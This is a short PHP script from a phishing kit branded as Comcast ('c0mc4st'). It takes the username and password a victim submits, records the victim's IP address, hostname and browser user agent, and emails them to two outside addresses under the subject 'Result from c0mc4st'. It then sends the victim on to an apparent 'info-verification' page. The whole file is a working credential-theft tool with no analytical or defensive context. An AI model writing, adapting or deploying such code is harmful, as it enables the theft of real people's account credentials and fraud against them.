<?php
if($_POST["user"] != "" and $_POST["passwd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------c0mc4st Info-----------------------\n";
$message .= "|U3er : ".$_POST['user']."\n";
$message .= "|Pa33w0rd  : ".$_POST['passwd']."\n";
$message .= "-------------created by j0n3z-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "henrygiles231@protonmail.com,moor3jam3s@yandex.com";
$subject = "Result from c0mc4st | $ip";
{
mail("$send", "$subject", $message);   
}

$praga=rand();
$praga=md5($praga);
  header ("Location: info-verification.html");
}else{
header ("Location: index.htm");
}

?>
 